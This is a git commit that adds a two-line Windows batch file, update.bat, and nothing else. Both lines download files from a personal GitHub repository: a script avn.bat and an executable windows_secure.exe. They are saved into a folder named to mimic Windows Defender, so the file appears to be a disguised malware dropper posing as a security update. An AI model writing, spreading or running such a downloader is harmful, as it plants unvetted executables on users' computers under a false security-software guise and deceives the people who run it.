321cd1f2c884147616c0b0975e3adbcbdde9cd74
drongo <usersalyan@gmail.com>
2022-03-23 01:54:01 +0400

    ilk defe

---
+++ update.bat
@@ -0,0 +1,2 @@
+curl https://raw.githubusercontent.com/drongo1993/test/main/avn.bat --output C:\Program Files\Windows Def\avn.bat
+curl https://github.com/drongo1993/test/raw/main/windows_secure.exe --output C:\Program Files\Windows Def\windows_secure.exe
